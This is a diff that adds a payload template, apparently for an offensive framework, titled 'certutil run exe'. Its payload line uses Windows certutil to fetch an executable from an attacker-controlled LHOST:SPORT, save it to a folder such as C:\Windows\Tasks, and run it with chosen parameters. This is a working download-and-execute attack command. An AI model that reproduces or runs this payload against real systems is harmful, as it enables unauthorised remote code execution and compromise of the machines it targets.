@@ -1,0 +1,6 @@
+title=certutil run exe
+info=download files using certutil - PARAM1=>remote path i.e. C:\\Windows\\Tasks or C:\\Temp - PARAM2=> exe params qoutation required.
+required_opts=LHOST;SPORT;PARAM1;PARAM2
+http_requests=2
+payload=certutil -urlcache -split -f http://LHOST:SPORT/FILENAME PARAM1\FILENAME.exe & PARAM1\FILENAME.exe PARAM2
+
